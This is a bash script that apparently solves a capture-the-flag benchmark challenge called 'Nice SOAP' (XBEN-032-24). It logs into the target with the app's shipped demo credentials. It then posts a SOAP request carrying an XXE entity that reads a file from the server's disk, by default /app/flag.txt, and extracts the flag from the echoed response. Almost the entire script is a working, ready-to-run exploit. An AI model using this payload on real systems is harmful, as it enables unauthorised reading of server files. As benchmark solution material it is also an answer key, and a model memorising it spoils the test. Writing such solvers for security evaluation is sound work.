#!/usr/bin/env bash
# XBEN-032-24 — "Nice SOAP" (tags: xxe, default_credentials)
#
# `/soap_service` parses the request body with
# `etree.XMLParser(resolve_entities=True)`. That one argument turns the XML
# parser into a file reader: a document may declare an entity pointing at a path
# on disk, and the parser will fetch it before the application sees the tree.
#
# The endpoint then echoes `account_id` back in its response, so whatever the
# entity expanded to comes straight back.
#
# The credentials are the demo pair the application ships with.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben032-$$"
FILE="${2:-file:///app/flag.txt}"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

body='<?xml version="1.0"?>'
body+="<!DOCTYPE r [<!ENTITY xxe SYSTEM \"$FILE\">]>"
body+='<GetAccountInfoRequest><account_id>&xxe;</account_id></GetAccountInfoRequest>'

"$H5I" browser open "$URL/login" --session "$SESSION" --new --capture >/dev/null
"$H5I" websec replay req_0 --create \
    --set 'method=POST' --set 'path=/login' \
    --set 'form.username=john' --set 'form.password=password123' \
    --session "$SESSION" >/dev/null
seq="$("$H5I" websec replay req_0 --create \
    --set 'method=POST' --set 'path=/soap_service' \
    --set 'header.Content-Type=application/xml' \
    --set "body.raw=$body" \
    --session "$SESSION" | python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec show "res_$seq" --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
